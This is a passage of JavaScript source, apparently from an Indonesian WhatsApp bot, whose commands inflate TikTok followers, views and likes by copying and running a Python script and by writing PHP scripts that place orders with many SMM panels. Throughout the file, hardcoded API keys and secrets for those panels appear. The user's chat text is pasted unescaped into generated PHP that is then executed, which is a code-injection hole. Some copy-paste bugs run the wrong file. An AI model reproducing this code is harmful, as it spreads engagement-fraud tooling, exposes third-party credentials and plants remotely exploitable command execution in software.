${prefix+command} favorit|url|jumlah
_Contoh_:
${prefix+command} favorit|https://vt.tiktok.com/ZS8KdFQcQ/|30000
*3. Untuk menambah Like*
${prefix+command} like|url|jumlah
_Contoh_:
${prefix+command} like|https://vt.tiktok.com/ZS8KdFQcQ/|30000

Harap jangan spam fitur ini apabila ketahuan maka anda akan di blokir secara otomatis oleh bot ini
`)
let tugas=text.split('|')[0];
let link=text.split('|')[1];
let jumlah=text.split('|')[2];
if ((tugas != 'views')&&(tugas != 'favorit')&&(tugas != 'like')) return newReply(`
FORMAT/URL SALAH!
tugas
Gunakan dengan cara:

*1. Untuk menambah Views*
${prefix+command} views|url|jumlah
_Contoh_:
${prefix+command} views|https://vt.tiktok.com/ZS8KdFQcQ/|30000
*2. Untuk menambah Favorit*
${prefix+command} favorit|url|jumlah
_Contoh_:
${prefix+command} favorit|https://vt.tiktok.com/ZS8KdFQcQ/|30000
*3. Untuk menambah Like*
${prefix+command} like|url|jumlah
_Contoh_:
${prefix+command} like|https://vt.tiktok.com/ZS8KdFQcQ/|30000

Harap jangan spam fitur ini apabila ketahuan maka anda akan di blokir secara otomatis oleh bot ini
`)
if (isNaN(jumlah)) return newReply(`
FORMAT/URL SALAH!

Gunakan dengan cara:
jumlah
*1. Untuk menambah Views*
${prefix+command} views|url|jumlah
_Contoh_:
${prefix+command} views|https://vt.tiktok.com/ZS8KdFQcQ/|30000
*2. Untuk menambah Favorit*
${prefix+command} favorit|url|jumlah
_Contoh_:
${prefix+command} favorit|https://vt.tiktok.com/ZS8KdFQcQ/|30000
*3. Untuk menambah Like*
${prefix+command} like|url|jumlah
_Contoh_:
${prefix+command} like|https://vt.tiktok.com/ZS8KdFQcQ/|30000

Harap jangan spam fitur ini apabila ketahuan maka anda akan di blokir secara otomatis oleh bot ini
`)

newReply(mess.wait)
const sourceDir = './lib/tiktok';
const destDir = `./lib/${m.chat}`;

if (!fs.existsSync(destDir)) {
  await fs.mkdirSync(destDir);
}
const files = await fs.readdirSync(sourceDir);
files.forEach(file => {
  const srcPath = `${sourceDir}/${file}`;
  const destPath = `${destDir}/${file}`;
  
  const stats = fs.lstatSync(srcPath);
  if (stats.isDirectory()) {
    fs.cpSync(srcPath, destPath, { recursive: true });
  } else {
    fs.copyFileSync(srcPath, destPath);
  }
});

console.log('Proses duplikasi folder selesai!');
let config = JSON.parse(fs.readFileSync(destDir+'/setting.json',))
config.url = link;
config.service = tugas.charAt(0).toUpperCase()+tugas.slice(1);
await fs.writeFileSync(destDir+'/setting.json', JSON.stringify(config, null, 2));

const pyProg = spawn('python',[destDir+'/main.py']);
console.log(typeof(jumlah))
setTimeout(jumlah/1000*70,()=>{
pyProg.kill();
newReply('proses penambahan '+tugas+ ' sebanyak' +jumlah+' telah sukses mungkin jumlah yang masuk tidak sesuai dengan yang disebutkan')
});
pyProg.stdout.on('data',(data)=>{
console.log(data.toString());
});
pyProg.stderr.on('data',(data)=>{
console.log(data.toString());
});




}
break

case 'ttfolls': {
  // Cek limit
  if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)

  // Cek format media
  if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *username tiktok*\n\n_Contoh_\n\n${prefix+command} yonkounoryu`)

  // Cek cooldown
  let lastFolls = global.db.data.users[m.sender].lastFolls
  if (new Date().getTime() - lastFolls < 86400 * 1000) {
    let remainingTime = Math.floor((86400 * 1000 - (new Date().getTime() - lastFolls)) / 1000)
    return newReply(`Cooldown masih aktif, tunggu ${remainingTime} detik untuk menggunakan kembali fitur ini.`)
  }

newReply("Mengirimkan Followers....")
let sukses=0;
let gagal=0;
let jumlah2 = 50;
let Linknya2 = text;
let idnya2 = 1641;
let script1=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://mirpedia.my.id/api/order';

// Menyiapkan data request
$data = array(
    'api_key' => 'dWbGtfhcEv19DqEZjm9EMfvWH',
    'api_id' =>'208',
    'service' => 11924, // ID Layanan yang ingin Anda gunakan
    'target' => '${Linknya2}',
    'quantity' => ${jumlah2}, // Jumlah pesanan Anda
    'custom_comments' => 'KOMENTAR_KUSTOM_ANDA'
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath1 = 'mirfoll.php';
await fs.writeFile(filePath1, script1, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath1);
});
const command1 = 'php mirfoll.php';
const Outputny1 = await exec(command1, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output mirpedia folls: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;
  newReply("Followers Berhasil Dikirim, Mungkin Perlu 30 menit Agar Followers Masuk Ke Akun Anda")
   // Update lastFolls
  global.db.data.users[m.sender].lastFolls = new Date().getTime()
  }
  else if(stdout.includes("false")||stdout.includes("error")){
  newReply("Followers Gagal Dikirim")
  gagal=gagal+1;
   // Update lastFolls
  global.db.data.users[m.sender].lastFolls = 0
  }
  
  
});
  
  // Tambah limit
  limitAdd(m.sender, limit)
}
break




case 'ttviews':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text.includes('tiktok.com')) return newReply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
newReply("Mengirimkan Views....")
let sukses=0;
let gagal=0;
let jumlah2 = 5000;
let Linknya2 = text;
let idnya2 = 1641;
let script1=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://senjapedia.com/api/order';

// Menyiapkan data request
$data = array(
    'api_id' => 'TXhRcmFMNUh1UHpHWURrSU1EWThlZz09',
    'api_key' => '09795b-2fe181-732987-391db6-3c40f1',
    'service' => 6192, // ID Layanan yang ingin Anda gunakan
    'target' => '${Linknya2}',
    'quantity' => ${jumlah2}, // Jumlah pesanan Anda
    'custom_comments' => 'KOMENTAR_KUSTOM_ANDA'
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath1 = 'senjapedia.php';
await fs.writeFile(filePath1, script1, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath1);
});
const command1 = 'php senjapedia.php';
const Outputny1 = await exec(command1, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output senjapedia: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}
  
  
});
await delay(9000)
let script2=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://smm.mirpedia.com/api/order';

// Menyiapkan data request
$data = array(
    'api_id' => 'UG9pbUNEb0Z6UForVitvQVpUQ2ozZz09',
    'api_key' => '5dd87d-a927ba-03b72f-730aa0-8bf6bb',
    'service' => ${idnya2}, // ID Layanan yang ingin Anda gunakan
    'target' => '${Linknya2}',
    'quantity' => ${jumlah2}, // Jumlah pesanan Anda
    'custom_comments' => 'KOMENTAR_KUSTOM_ANDA'
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath2 = 'mirped.php';
await fs.writeFile(filePath2, script2, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath2);
});
const command2 = 'php mirped.php';
const Outputny2 = await exec(command2, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output smm mirped: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}
  
  
  
});
await delay(9000)
let script3=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://ryupedia.biz.id/api/sosial-media';

// Menyiapkan data request
$data = array(
    'api_key' => '6GYZkVnesyT6O3SxpWpqtAlw0CNrQjz00SqHtVfWo0',
    'action' => 'pemesanan',
    'layanan' => ${idnya2}, // ID Layanan yang ingin Anda gunakan
    'target' => '${Linknya2}',
    'jumlah' => ${jumlah2} // Jumlah pesanan Anda
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath3 = 'ryupedia.php';
await fs.writeFile(filePath3, script3, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath3);
});
const command3 = 'php mirped.php';
let Outputny3 = await exec(command3, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output ryupedia: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}
});

await delay(9000)
let script4=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://d-media.net/api';

// Menyiapkan data request
$data = array(
    'key' => '3p5b0xi5xd6pa5vstj1ie3pi8tgux010',
    'action' => 'add',
    'service' => 962, // ID Layanan yang ingin Anda gunakan
    'link' => '${Linknya2}',
    'quantity' => 10000 // Jumlah pesanan Anda
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath4 = 'dmedia.php';
await fs.writeFile(filePath4, script4, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath4);
});
const command4 = 'php dmedia.php';
let Outputny4 = await exec(command4, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output d-media: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}
});
await delay(9000)
let script5=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://rajaindosmm.com/api/sosial-media';

// Menyiapkan data request
$data = array(
    'api_key' => 'q9BEZFQtMTNVh2WDnqvP0SJslbwXJGOd',
    'action' => 'pemesanan',
    'layanan' => 11621, // ID Layanan yang ingin Anda gunakan
    'target' => '${Linknya2}',
    'jumlah' => 10000 // Jumlah pesanan Anda
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath5 = 'rajasmm.php';
await fs.writeFile(filePath5, script5, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath5);
});
const command5 = 'php rajasmm.php';
let Outputny5 = await exec(command5, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output rajasmm: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}
});
await delay(9000)

let script6=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://panel.lapaksosmed.com/api/order';

// Menyiapkan data request
$data = array(
    'api_id' => 300580,
    'api_key' => 'sG4mI3b6nBX9vyOs9N0OnBUIlLTbD6fq',
    'service' => 3367, // ID Layanan yang ingin Anda gunakan
    'target' => '${Linknya2}',
    'quantity' => 10000, // Jumlah pesanan Anda
    'custom_comments' => 'KOMENTAR_KUSTOM_ANDA'
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath6 = 'lapaksosmed.php';
await fs.writeFile(filePath6, script6, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath6);
});
const command6 = 'php lapaksosmed.php';
const Outputny6 = await exec(command6, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output lapaksosmed: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}

});
await delay(9000)
let script7=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://pusatpanelsmm.com/api/sosial-media';

// Menyiapkan data request
$data = array(
    'api_key' => 'oWTQspTgLUd8aUj2QFx9a3d0PV5IXtuM',
    'action' => 'pemesanan',
    'layanan' => 45934, // ID Layanan yang ingin Anda gunakan
    'target' => '${Linknya2}',
    'jumlah' => 10000 // Jumlah pesanan Anda
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath7 = 'pusatpanel.php';
await fs.writeFile(filePath7, script7, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath7);
});
const command7 = 'php pusatpanel.php';
let Outputny7 = await exec(command7, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output pusatpanel: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}
});
await delay(9000)
let script8=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://www.jagososmed.online/api/json.php';

// Menyiapkan data request
$data = array(
    'api_key' => 'AGBANOKAn5lWb7X34nKNIp7Y',
    'action' => 'order',
    'service' => 3720, // ID Layanan yang ingin Anda gunakan
    'data' => '${Linknya2}',
    'quantity' => 10000 // Jumlah pesanan Anda
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath8 = 'jagososmed.php';
await fs.writeFile(filePath8, script8, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath8);
});
const command8 = 'php jagososmed.php';
let Outputny8 = await exec(command8, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output jagososmed: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}
});
await delay(9000)
let script9=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://api.medanpedia.co.id/order';

// Menyiapkan data request
$data = array(
    'api_id' => 23373,
    'api_key' => 'da6d3d-128bfd-4439d5-7714e8-9ab4fe',
    'service' => 3720, // ID Layanan yang ingin Anda gunakan
    'target' => '${Linknya2}',
    'quantity' => 10000, // Jumlah pesanan Anda
    'custom_comments' => 'KOMENTAR_KUSTOM_ANDA'
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath9 = 'medanpedia.php';
await fs.writeFile(filePath9, script9, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath9);
});
const command9 = 'php medanpedia.php';
const Outputny9 = await exec(command9, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output medanpedia: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}
});

await delay(9000)
let script10=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://danapedia.id/api/order';

// Menyiapkan data request
$data = array(
    'api_id' => 'RjAyZzBxNVF5aGhpbnpqZTBKMXlGUT09',
    'api_key' => 'aef212-e3f677-a7ddbe-cc6102-77943a',
    'service' => 2406, // 15913 ID Layanan yang ingin Anda gunakan
    'target' => '${Linknya2}',
    'quantity' => 5000, // Jumlah pesanan Anda
    'custom_comments' => 'KOMENTAR_KUSTOM_ANDA'
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath10 = 'danapedia.php';
await fs.writeFile(filePath10, script10, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath10);
});
const command10 = 'php danapedia.php';
const Outputny10 = await exec(command10, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output danapedia: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}
});
await delay(9000)
let script11=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://www.ashpedia-smm.com/api/order';

// Menyiapkan data request
$data = array(
    'api_id' => 2287,
    'api_key' => '9e460da9341f0fdca63fdf39b2f7afe6cec58de713f1ee5097b3ad738f5aa643',
    'secret_key' => 12345678,
    'service' => 940, // ID Layanan yang ingin Anda gunakan
    'target' => '${Linknya2}',
    'quantity' => 1000, // Jumlah pesanan Anda
    'custom_comments' => 'KOMENTAR_KUSTOM_ANDA'
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath11 = 'ashpedia.php';
await fs.writeFile(filePath11, script11, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath11);
});
const command11 = 'php ashpedia.php';
const Outputny11 = await exec(command11, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output ashpedia: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}
});
await delay(9000)
let script12=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://sprintpedia.id/api/order';

// Menyiapkan data request
$data = array(
    'secret_key' => 'enJndE53WEtxOVFIR2s1N1EyaU1EQT09',
    'api_key' => '64c609-f339f7-69d0a2-917edb-92926e',
    'service' => 2205, // ID Layanan yang ingin Anda gunakan
    'target' => '${Linknya2}',
    'quantity' => 10000, // Jumlah pesanan Anda
    'custom_comments' => 'KOMENTAR_KUSTOM_ANDA'
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath12 = 'sprintpedia.php';
await fs.writeFile(filePath12, script12, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath12);
});
const command12 = 'php sprintpedia.php';
const Outputny12 = await exec(command12, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output sprintpedia: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}
});

await delay(9000)
let script13=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://herupedia.id/api/order';

// Menyiapkan data request
$data = array(
    'api_id' => 'ZzlrREVlczBFWUlCRG9BcU4xaFdVZz09',
    'api_key' => '0648c5-592695-89c992-940969-86af84',
    'service' => 1613, // ID Layanan yang ingin Anda gunakan
    'target' => '${Linknya2}',
    'quantity' => 10000, // Jumlah pesanan Anda
    'custom_comments' => 'KOMENTAR_KUSTOM_ANDA'
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath13 = 'herupedia.php';
await fs.writeFile(filePath13, script13, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath13);
});
const command13 = 'php herupedia.php';
const Outputny13 = await exec(command13, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output herupedia: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}
  
  
  
});
await delay(9000)
let script14=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://hannpedia-smm.com/api/order';

// Menyiapkan data request
$data = array(
    'api_id' => 'T0hpY3FObjAzUmt0NHREdS9Gcmp5UT09',
    'api_key' => 'ea2a86-f3f4c5-3d0845-6811a4-916371',
    'service' => 928, // ID Layanan yang ingin Anda gunakan
    'target' => '${Linknya2}',
    'quantity' => 10000, // Jumlah pesanan Anda
    'custom_comments' => 'KOMENTAR_KUSTOM_ANDA'
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath14 = 'hannpedia.php';
await fs.writeFile(filePath14, script14, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath14);
});
const command14 = 'php hannpedia.php';
const Outputny14 = await exec(command14, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output hannpedia: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}
});
await delay(9000)
let script15=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://davissapedia.my.id/api/order';

// Menyiapkan data request
$data = array(
    'api_key' => '7Kkd0RhHfAGNWeqeaDMW7HoSx',
    'service' =>  1821, // ID Layanan yang ingin Anda gunakan
    'target' => '${Linknya2}',
    'quantity' => 9999, // Jumlah pesanan Anda
    'custom_comments' => 'KOMENTAR_KUSTOM_ANDA'
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath15 = 'davissapedia.php';
await fs.writeFile(filePath15, script15, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath15);
});
const command15 = 'php davissapedia.php';
const Outputny15 = await exec(command15, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output davissapedia: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}
});

await delay(9000)
let script16=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://kamupedia.com/api/social-media';

// Menyiapkan data request
$data = array(
    'key' => 'hyIVRa6AUYydgO6SDHqt7m85MgvzDK562yy7FFbeJLdHKj4mqhW9R3RnrbaShKT4',
    'sign' => '09dee407b3ea747cc94261db555a0458',
    'type' => 'order',
    'service' =>  16536, // ID Layanan yang ingin Anda gunakan
    'quantity' => 10000, // Jumlah pesanan Anda
    'data' => '${Linknya2}'
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath16 = 'kamupedia.php';
await fs.writeFile(filePath16, script16, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath16);
});
const command16 = 'php kamupedia.php';
const Outputny16 = await exec(command16, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output kamupedia: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}
});
await delay(9000)
let script17=`
<?php

// Mendefinisikan endpoint URL
$endpoint = 'https://pay-pedia.com/api/social-media';

// Menyiapkan data request
$data = array(
    'key' => 'jQdTtLa6QTjbtdRv9d0rKbF5oLfaATscwrmoFGf8EBedxexqo64f8ZqyRymXkdsy',
    'sign' => md5("jQdTtLa6QTjbtdRv9d0rKbF5oLfaATscwrmoFGf8EBedxexqo64f8ZqyRymXkdsy"."7bf629347a2c75a65e654207d20924d6"),
    'type' => 'order',
